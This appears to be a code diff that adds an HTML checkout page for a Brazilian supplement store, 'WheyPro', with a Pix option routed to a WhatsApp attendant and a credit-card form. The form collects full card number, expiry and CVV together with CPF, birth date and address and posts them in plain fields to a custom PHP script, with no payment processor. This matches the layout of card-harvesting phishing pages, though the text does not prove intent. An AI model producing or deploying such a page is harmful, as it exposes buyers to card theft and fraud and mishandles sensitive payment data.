@@ -1,0 +1,127 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Pagamento - WheyPro</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+            margin: 0;
+        }
+
+        header {
+            text-align: center;
+            background-color: #333;
+            color: white;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .payment-option {
+            margin: 20px 0;
+            background-color: #f0f0f0;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .payment-option button {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            border-radius: 8px;
+            margin: 5px 0;
+        }
+
+        .payment-option .pix-button {
+            background-color: #34b7f1; /* Cor para o Pix */
+            color: white;
+        }
+
+        .payment-option .credito-button {
+            background-color: #28a745; /* Cor para Cartão de Crédito */
+            color: white;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Escolha o Método de Pagamento</h1>
+</header>
+
+<div class="container">
+    <h2>Selecione seu método de pagamento para completar sua compra</h2>
+
+    <!-- Opção de pagamento via Pix -->
+    <div class="payment-option">
+        <h3>Pagar via Pix</h3>
+        <p>Escolha esta opção para pagar com Pix e ser redirecionado para o atendente no WhatsApp.</p>
+        <a href="https://wa.me/message/XEE7TITFPKF6K1" target="_blank">
+            <button class="pix-button">Pagar com Pix (Redirecionar para atendente)</button>
+        </a>
+    </div>
+
+    <!-- Opção de pagamento via Cartão de Crédito -->
+    <div class="payment-option">
+        <h3>Pagar com Cartão de Crédito</h3>
+        <p>Preencha seus dados abaixo e enviaremos as informações para o seu pagamento.</p>
+        <form action="processa_pagamento.php" method="POST">
+            <input type="text" name="nome" placeholder="Seu Nome" required>
+            <input type="email" name="email" placeholder="Seu Email" required>
+            <input type="text" name="cpf_cnpj" placeholder="CPF ou CNPJ" required>
+            <input type="text" name="telefone" placeholder="Número de Telefone" required>
+            <input type="text" name="data_nascimento" placeholder="Data de Nascimento" required>
+            <input type="text" name="endereco" placeholder="Endereço (Rua, Número, Bairro)" required>
+            <input type="text" name="cidade" placeholder="Cidade" required>
+            <input type="text" name="estado" placeholder="Estado" required>
+            <input type="text" name="cep" placeholder="CEP" required>
+            <input type="text" name="numero_cartao" placeholder="Número do Cartão de Crédito" required>
+            <input type="text" name="data_vencimento" placeholder="Data de Vencimento (MM/AA)" required>
+            <input type="text" name="codigo_seguranca" placeholder="Código de Segurança (CVV)" required>
+        
+            <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
+        </form>
+        
+    </div>
+</div>
+
+<footer>
+    <p>&copy; 2025 WheyPro - Todos os direitos reservados</p>
+</footer>
+
+</body>
+</html>
